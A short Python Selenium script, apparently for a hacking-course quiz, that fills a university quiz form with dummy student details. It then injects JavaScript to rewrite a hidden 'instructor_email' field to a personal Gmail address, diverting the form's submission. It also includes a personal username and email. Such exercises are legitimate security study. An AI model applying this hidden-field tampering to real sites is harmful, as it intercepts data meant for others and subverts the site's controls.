from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Set up the web driver
driver = webdriver.Chrome(executable_path='C:\\Users\\calik\\IdeaProjects\\Hacking_Quiz_1\\chromedriver.exe')

# Open the Quiz Page
driver.get("https://faculty.uca.edu/vparuchuri/4315/4315_quiz1.htm")

# Wait for the page to load
time.sleep(3)  # Adjust as necessary

# Enter Name, ID, and Email
driver.find_element_by_name('student_name').send_keys('test')
driver.find_element_by_name("student_id").send_keys('1234567')
driver.find_element_by_name('student_email').send_keys('test@test.com')

# Bypass Selenium rules by using JavaScript to modify the hidden input field
email_js = "document.getElementsByName('instructor_email')[0].setAttribute('value', 'calikennedy81@gmail.com');"
driver.execute_script(email_js)

